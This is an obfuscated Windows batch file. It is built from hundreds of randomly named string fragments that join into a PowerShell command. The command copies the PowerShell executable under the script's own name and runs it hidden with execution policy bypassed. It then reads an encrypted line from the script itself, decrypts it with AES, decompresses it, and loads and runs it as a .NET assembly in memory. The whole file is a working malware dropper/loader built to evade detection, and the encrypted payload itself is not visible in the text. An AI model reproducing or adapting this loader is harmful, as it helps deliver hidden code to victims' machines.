@echo off
set "XUrldyNIMI=ojd."
set "SJCplzjyzg=)))"
set "AuEYZtQeHD=ne);"
set "bNNZiYQEwF=nV);"
set "QluUmaQode=yste"
set "VhFAfSWGgO=fmnV"
set "LofXdDJdky=;$UZ"
set "pQirMuCsfD=yTo("
set "FUEXJzwqeq=jlQY"
set "wjwnKUwjCX=zHhH"
set "ThamJaJyoE=[-1."
set "BHlifJzSYM=1] -"
set "MvPsdEhhNj=Disp"
set "OPIvBozwEm=1..-"
set "liWXGZISWP=esMa"
set "KGePOBkfpo=Ffmn"
set "EIsnsnjIqn=h) {"
set "OEzOlDdreR=n ''"
set "pAGPuQaKju=TllA"
set "KuZJLsSSHo=ddin"
set "mMBgbqKGWW=raph"
set "gTVDQHkQgQ=Mode"
set "SKIPeVLqcY=-joi"
set "HGHIFBWzDA=Yc, "
set "JFBsZADqem=.Cre"
set "BbZqYngCsh=$cWi"
set "BPLHBSGxoS=] -j"
set "nMubFJyYlY=eam("
set "BSNxqOfeZb=V = "
set "ZrJIkBdkTw=gMod"
set "aHsYIXpaOl=106u"
set "ZSLFGoCCrE=brea"
set "eRUqxGeMwe=ress"
set "YxVbAseSMc=ptor"
set "YoqFOoVfiG=RmAx"
set "RlDKnnSSFC=();$"
set "WAWAvLucxV=Fina"
set "mIvlEktFmr=.GZi"
set "pLldbxATpO=);$c"
set "dzdhqiENun=ddin"
set "SqSNGBCZMc=ypto"
set "EDZRReRPJi=::('"
set "MiGJcsIsUL=nV ="
set "nsZsVUdsOu=esaB"
set "hZZCHolGoC='[-1"
set "fRcSsSdXSb= if "
set "klxwLDkTgt=vert"
set "GdgTkVFSne=$VRo"
set "KdLlOkdHdu=)($Y"
set "CrUOJlOIgN=flec"
set "oFDxHYJdDz=em.I"
set "RjOzEKZDVr=.Ass"
set "WlXIqcWCGf=pStr"
set "mdjQlqDhtq=m.Re"
set "VXzrVQhlxr=jgLh"
set "DbOjcXTuoZ==');"
set "wTjcxTFhun=);$V"
set "AxxsZpQnxy=mory"
set "cxYwisdswa=-1.."
set "WwZaBNhlnG=$Ffm"
set "wrIkbTmsRC=gth)"
set "QXvONJmeEh=gLhx"
set "TjgoGkUXRa=ss -"
set "tejNIIxAUZ=y.Pa"
set "uKOtFTYdop=::De"
set "ntIFqFVSrW=fore"
set "SSUzTblVfL=.Mem"
set "dFJPqoMlrx=axcY"
set "RPZoTHBKVQ=bypa"
set "LkRPLhbXKx=rity"
set "xFCQqDkipw=-4] "
set "KgrQgRtbUm=Atm."
set "lBqgQnDhVW=ress"
set "dPQfydXNWv=Syst"
set "aQtfzsDukY=('da"
set "MRpvqPnuoI=ispo"
set "mkNPteubau=oL'["
set "QVqpdHcbdg=Ffmn"
set "pAgugyfxjv=raph"
set "xfVGRGwzlt=16] "
set "uGGaujebtj=d;$V"
set "PTocZurQCc=l5E7"
set "kiiFapKYni=ing("
set "WAZvdUBsHg=morF"
set "sKyiLUwXqx=in $"
set "DmSHiHMwXf=join"
set "GEPEsZILxx=ose("
set "UzRpsMBOyV=$cWi"
set "PBSlDWUdjL=ert]"
set "SJtZKgZXvj= = ["
set "UJIbvbCxPX=form"
set "IIQQPhpNOo=tion"
set "EplKXlBQIR=ateD"
set "fkCSXssllV= = N"
set "jykdTajMrG=pose"
set "KaLfoxszdm=orF'"
set "BuCRJBcmbm=nirt"
set "YTOYMMTpQe=('Tg"
set "ZmvXaRHaVw=c = "
set "xfPZnvpodH=gjYA"
set "SsCCpZHKLi=S46e"
set "NYuKkUqRNI=ion."
set "OTUmzmlhHC=zuZI"
set "ydjGyOpJDv=Conv"
set "IJnkDzZycN= [st"
set "uiOOKsqUiD=;$cu"
set "pBMRnwavrY=se()"
set "zcuSUaVHEJ=..-1"
set "AlxFMYVdcH=RoWk"
set "EfBTXAgSTm=$STf"
set "VWJYxAlUGl=, $F"
set "eTIZIFPlOq= = $"
set "gTYbFSxnaN=hx.D"
set "BBwHdvcUkW=tem."
set "rSfjKAcrCK=.IO."
set "qYnVbbWwHB=F'[-"
set "dCYlnoGWEO=comp"
set "GuiUieYeHp=$axc"
set "DTJsyrltpU=ct S"
set "DBYWhjSYep='')("
set "XaYTvAWRYP=YxVw"
set "DCgEWUbmzd=($jl"
set "nOyCpZpfFw=ay()"
set "jIDxJqeaPy=pose"
set "acAJNkWMay=.Sec"
set "UYxzebFFuD=em.C"
set "qebDYZPebt=$jgL"
set "MolihHNynx=Zojd"
set "NuqmAamUZB=pres"
set "VGyNKZueFL=[Sys"
set "PcDVpfHdWb=VRoW"
set "PxlsPDzuyl=Disp"
set "PTwjUvkCRk=Atm "
set "jHOkRoGIpO='[-1"
set "EwloCqqoSs=EUQq"
set "hKtLhMCRHH=th('"
set "tmbDDUlTVI=:('g"
set "ciuwcLqTvI=ecry"
set "FnHyWRSLWr=RoWk"
set "gspklKskPy=QYg."
set "lgrOrwJRlv=iron"
set "taLhYznlFl='gni"
set "HXsWXCrvDs=]::("
set "BXBCvtYVPs=[Sys"
set "pJeCWIdjyl=am;$"
set "rpOVyTprUv=m.IO"
set "oFChtsiuPN= [Sy"
set "dWcUeCYstr=oArr"
set "NoWqJTIUWr=[]] "
set "vuAwTZROAs=eMVs"
set "qbPaWRkHvi=, (,"
set "HplHWAMrNX=tsWi"
set "yDFHvjYOPd=y.Cr"
set "koWXHOhQql=EUQq"
set "FLPCUJyIHg=rity"
set "YCGNIxdQDK=y.Ci"
set "hRQVWShFdz=null"
set "UvFFfDzPkI=Wk.I"
set "KxxZvefxGw=Vh ="
set "mlpRvztiNm=ode]"
set "NeDVvnDQfB=ewLi"
set "HUeyCUUZPZ=Invo"
set "jxZRjFBWDw=e = "
set "SoSyfewePr='txe"
set "tLgNdFZExU=y.En"
set "dnRZAxTNOk=();$"
set "NUiUDJoJwv=sion"
set "TxDYbSuIDs=.Cop"
set "JmgzwFupZF=-ep "
set "yguYjWXmKw=Ffmn"
set "rifqDzNXGS=rtS4"
set "ydWbAvfzpE=($jl"
set "hfBoDLbhpZ=6esa"
set "NoLAsHMyEm=V, 0"
set "DygvScRbbE=File"
set "XFlMCuCIWS== $V"
set "SyoSYstgnZ=tm.T"
set "oErUNNTDoF=.Cry"
set "LuhFKGFObF=[Env"
set "BBpzFjjfol=V = "
set "jISGLdwsLQ='0Pg"
set "uDoOPveSOr=embl"
set "OodTZGJTYk=Secu"
set "jNKCHxKZwv=comm"
set "dmGrlZtTvN=e]::"
set "zbQeoVTHOP=onve"
set "FqVUYRVbuU=tryP"
set "ATiuqLvSIN=:: '"
set "GRaSByOFni=cYc."
set "NlhoJnsxKG=join"
set "eWJogZjusr=-nop"
set "GMpyRlnWPM=);$U"
set "NMdqhzouGV=[IO."
set "plXjBHHWzP=)($F"
set "gDCILyDGrw=('%*'"
set "NYHxDUhnjL=yste"
set "QxaYNhvjez=tem."
set "jlsGbDRWWg=n ''"
set "ucHFIugyxF=PxEW"
set "YgWddEZOgv=Obje"
set "MvunLCdcAm=Comp"
set "kUadfxkoUR=tem."
set "atNZtEVZEQ=.Dis"
set "ZHOpYNJtQT=PKCS"
set "mOvIMWcrMu=Secu"
set "xmPgfAHuCt=m.IO"
set "jaMqNSGpdl=]::C"
set "SbVboKpquj=ose("
set "PFYGHBPHIK=ach "
set "OKrHosCuKx=.Key"
set "zwobUjQnxX=ck($"
set "hIeGZQEKiP=$YxA"
set "RVqNNWubzB=rt]:"
set "WCozSsSizX= [Sy"
set "YbwRqatWWG=  $Y"
set "VyUSiqkXRu=ke($"
set "jsuvOzXfKs= '')"
set "mBhNbYnJGw=.-16"
set "OnWjwifFOR=lBlo"
set "vuLHHniZnE=O.Me"
set "ONJDksTEBH=).Sp"
set "DiwWaLndIv=STfV"
set "NiugHXKHer== [S"
set "MOsqBhaZpy=.Con"
set "fXkriYxXlQ=kgy "
set "iYCyRiqiwg=rans"
set "JqrcFfswiK=bstr"
set "umkvXeUIyB=s75K"
set "LikurcdmUX=wJ.T"
set "YUgloQtVvr=New-"
set "iNbALswCYL=$Ffm"
set "yTZrwVRNSB=ress"
set "whvRlFIluz=;$Yx"
set "rQMZUFWFvI=3); "
set "mHOmCEilYa=Obje"
set "uZAYIPRdVU===')"
set "cjisPqrCZc=PTtG"
set "MWmJWcvACg=7;$V"
set "ojACTPivML=gsYZ"
set "EcJAmmrqef=t Sy"
set "YxztCiRFnC=-joi"
set "CdCCOlxNHQ=RoWk"
set "JgmvSTnZSw=nage"
set "JxdmUTghAc= '')"
set "NyQgXdKBJE=oint"
set "qXvsgCvQYA=.Mod"
set "EVnPRybRFH=bjec"
set "BIDURdonTc=Stre"
set "IImRtxxSoE=hy.A"
set "YAqXOIVNRP=and "
set "qBFDrlfYyi=urit"
set "oplsagxQaI=g = "
set "IuiimdliVw=WiwJ"
set "IoPydQgQfT=dj0C"
set "pFqFOZPshP=grap"
set "gdCIdlKOJn=.Len"
set "AuWyaOGKZS=stem"
set "eJLhQhIsZP=RoWk"
set "irknppxWLM=.Cry"
set "HxXXaWrTPS=CFxo"
set "DSqpiMZqsg=Syst"
set "jbNkaBNonJ=]::("
set "eHtWByvzqg=-Obj"
%bEjKjBeADp%%LiSVeIXQDL%%OfhyhDmtVs%%aiTUbyMxmi%%fGhRLTCocP%%XjKxoVxLCG%%oKEloDpXUF%%WzDvGiYpMn%%aYrfuRyvFf%%abVGUucWCi%%EFtwTxFpRg%%XhYoFptzQx%%fUsOFUEXBm%%gbNEJvEUlX%%liEyiSdGaE%%aCgfdKmFRZ%%TINEaWuuEk%%KznTlWqUGM%%RXXXlDVHAZ%%iZdmdDuZxl%%xIbPTBpmTh%%usYeiVLQtx%%aNTFbKwaPI%%BqwuoiVhdJ%%nIOtFQbYeh%%RDGalKPwOi%%fpwkFdWDPZ%%aDNJksYAZl%%JxVIQXKvjE%%tztUEXmDNB%%UxiehnQWPS%%MowCzHtOuH%%tAtlGAkSem%"%~dp0%~nx0.exe"
cls
%WcDBBeEgEb%%jrFDzaCVjJ%
"%~nx0.exe" %eWJogZjusr%%JRzSatPqDG%%yUbLxgPwKQ%%JmgzwFupZF%%RPZoTHBKVQ%%TjgoGkUXRa%%jNKCHxKZwv%%YAqXOIVNRP%%EfBTXAgSTm%%KxxZvefxGw%%WCozSsSizX%%ohfcwdlQEh%%rSfjKAcrCK%%DygvScRbbE%%HXsWXCrvDs%%SoSyfewePr%%pAGPuQaKju%%mjPZztAjlh%%jHOkRoGIpO%%FMmJpgrCCh%%BHlifJzSYM%%DmSHiHMwXf%%jsuvOzXfKs%%cXHeFCwFei%%ONJDksTEBH%%uVFwXjmPuF%%LuhFKGFObF%%lgrOrwJRlv%%GsDdYgslgw%%pGlzxuGdTE%%NeDVvnDQfB%%AuEYZtQeHD%%ntIFqFVSrW%%PFYGHBPHIK%%DCgEWUbmzd%%DCwpquwXFP%%sKyiLUwXqx%%DiwWaLndIv%%EIsnsnjIqn%%fRcSsSdXSb%%ydWbAvfzpE%%gspklKskPy%%KNHdsMgDEh%%HplHWAMrNX%%hKtLhMCRHH%%ATiuqLvSIN%%oCUhXQhHnK%%YbwRqatWWG%%koWXHOhQql%%eTIZIFPlOq%%FUEXJzwqeq%%rzWcDaGXzi%%JqrcFfswiK%%kiiFapKYni%%rQMZUFWFvI%%ZSLFGoCCrE%%gZhtfjrrco%%pHJrQTErhZ%%iNbALswCYL%%MiGJcsIsUL%%oFChtsiuPN%%KlusvsYHHM%%MOsqBhaZpy%%klxwLDkTgt%%jbNkaBNonJ%%taLhYznlFl%%rifqDzNXGS%%hfBoDLbhpZ%%tLMFfjApym%%qYnVbbWwHB%%OPIvBozwEm%%xfVGRGwzlt%%YxztCiRFnC%%OEzOlDdreR%%KdLlOkdHdu%%EwloCqqoSs%%wTjcxTFhun%%DfvtIVMnFs%%fkCSXssllV%%nOyLuQUJNV%%EVnPRybRFH%%EcJAmmrqef%%AuWyaOGKZS%%acAJNkWMay%%qBFDrlfYyi%%yDFHvjYOPd%%SqSNGBCZMc%%pFqFOZPshP%%IImRtxxSoE%%liWXGZISWP%%JgmvSTnZSw%%uGGaujebtj%%eJLhQhIsZP%%qXvsgCvQYA%%jxZRjFBWDw%%VGyNKZueFL%%kUadfxkoUR%%OodTZGJTYk%%FLPCUJyIHg%%irknppxWLM%%vncMIGDFNe%%pAgugyfxjv%%YCGNIxdQDK%%iNhlPrJcUn%%gTVDQHkQgQ%%jaMqNSGpdl%%CNbcVCsUEO%%PcDVpfHdWb%%mnJNBibRyW%%KuZJLsSSHo%%oplsagxQaI%%lDsbYoenBM%%BBwHdvcUkW%%mOvIMWcrMu%%LkRPLhbXKx%%oErUNNTDoF%%eCGdvxhJob%%mMBgbqKGWW%%tejNIIxAUZ%%dzdhqiENun%%ZrJIkBdkTw%%dmGrlZtTvN%%ZHOpYNJtQT%%MWmJWcvACg%%FnHyWRSLWr%%OKrHosCuKx%%SJtZKgZXvj%%DSqpiMZqsg%%UYxzebFFuD%%zbQeoVTHOP%%RVqNNWubzB%%tmbDDUlTVI%%BuCRJBcmbm%%SsCCpZHKLi%%HDgSkmamBt%%KaLfoxszdm%%ThamJaJyoE%%mBhNbYnJGw%%BPLHBSGxoS%%GiHzozCTjj%%DBYWhjSYep%%jISGLdwsLQ%%umkvXeUIyB%%vuAwTZROAs%%aHsYIXpaOl%%cjisPqrCZc%%ojACTPivML%%mISsQNTlNZ%%OTUmzmlhHC%%IoPydQgQfT%%PTocZurQCc%%xfPZnvpodH%%DbOjcXTuoZ%%GdgTkVFSne%%UvFFfDzPkI%%BSNxqOfeZb%%BXBCvtYVPs%%QxaYNhvjez%%ydjGyOpJDv%%PBSlDWUdjL%%EDZRReRPJi%%sVZzDxOUdH%%dpstCpEPuR%%nsZsVUdsOu%%WAZvdUBsHg%%hZZCHolGoC%%zcuSUaVHEJ%%tvfJLCqWqI%%NlhoJnsxKG%%JxdmUTghAc%%YTOYMMTpQe%%YoqFOoVfiG%%HxXXaWrTPS%%wjwnKUwjCX%%ucHFIugyxF%%XaYTvAWRYP%%uZAYIPRdVU%%RMDlmEQrpF%%PTwjUvkCRk%%XFlMCuCIWS%%CdCCOlxNHQ%%JFBsZADqem%%EplKXlBQIR%%ciuwcLqTvI%%YxVbAseSMc%%RlDKnnSSFC%%KGePOBkfpo%%kJVvohtjjE%%hIeGZQEKiP%%SyoSYstgnZ%%iYCyRiqiwg%%UJIbvbCxPX%%WAWAvLucxV%%OnWjwifFOR%%zwobUjQnxX%%QVqpdHcbdg%%NoLAsHMyEm%%VWJYxAlUGl%%VhFAfSWGgO%%gdCIdlKOJn%%wrIkbTmsRC%%whvRlFIluz%%KgrQgRtbUm%%PxlsPDzuyl%%GEPEsZILxx%%CztkDqZSej%%AlxFMYVdcH%%gnMiSfqNxg%%jIDxJqeaPy%%DGqpLvhkRu%%dFJPqoMlrx%%ZmvXaRHaVw%%UUnDdAXxww%%YgWddEZOgv%%DTJsyrltpU%%OgpuzirfMQ%%rpOVyTprUv%%SSUzTblVfL%%oDiCHSRBDU%%mUcpdneNUF%%bTzTbVmPBy%%WwZaBNhlnG%%bNNZiYQEwF%%WxbAKueoAM%%FcafXQUbNq%%gTAoDogzKd%%eHtWByvzqg%%ISKAaZNIbs%%dPQfydXNWv%%oFDxHYJdDz%%vuLHHniZnE%%AxxsZpQnxy%%BIDURdonTc%%pJeCWIdjyl%%VXzrVQhlxr%%hwGfXNRRPD%%YUgloQtVvr%%mHOmCEilYa%%VdQBVTdYFj%%QluUmaQode%%xmPgfAHuCt%%EGSOIVeEqu%%NuqmAamUZB%%NUiUDJoJwv%%mIvlEktFmr%%WlXIqcWCGf%%nMubFJyYlY%%GuiUieYeHp%%HGHIFBWzDA%%NMdqhzouGV%%MvunLCdcAm%%eRUqxGeMwe%%NYuKkUqRNI%%QEyMDlluXc%%yTZrwVRNSB%%uCYBhOaKdQ%%mlpRvztiNm%%uKOtFTYdop%%dCYlnoGWEO%%lBqgQnDhVW%%CIaGgKNEWo%%QXvONJmeEh%%TxDYbSuIDs%%pQirMuCsfD%%BbZqYngCsh%%bzDOdeebFn%%qebDYZPebt%%gTYbFSxnaN%%MRpvqPnuoI%%pBMRnwavrY%%ybBZbhABil%%GRaSByOFni%%MvPsdEhhNj%%SbVboKpquj%%pLldbxATpO%%IuiimdliVw%%atNZtEVZEQ%%jykdTajMrG%%dnRZAxTNOk%%yguYjWXmKw%%BBpzFjjfol%%UzRpsMBOyV%%LikurcdmUX%%dWcUeCYstr%%nOyCpZpfFw%%uiOOKsqUiD%%fXkriYxXlQ%%NiugHXKHer%%NYHxDUhnjL%%mdjQlqDhtq%%CrUOJlOIgN%%IIQQPhpNOo%%RjOzEKZDVr%%uDoOPveSOr%%gygwdDntae%%aQtfzsDukY%%mkNPteubau%%cxYwisdswa%%xFCQqDkipw%%SKIPeVLqcY%%jlsGbDRWWg%%plXjBHHWzP%%UlMEBsOjsm%%GMpyRlnWPM%%MolihHNynx%%oPRneXyOfI%%OIDKzDVysq%%tLgNdFZExU%%FqVUYRVbuU%%NyQgXdKBJE%%LofXdDJdky%%XUrldyNIMI%%HUeyCUUZPZ%%VyUSiqkXRu%%hRQVWShFdz%%qbPaWRkHvi%%IJnkDzZycN%%nQRrAQdjBK%%NoWqJTIUWr%%gDCILyDGrw%%SJCplzjyzg%
exit /b
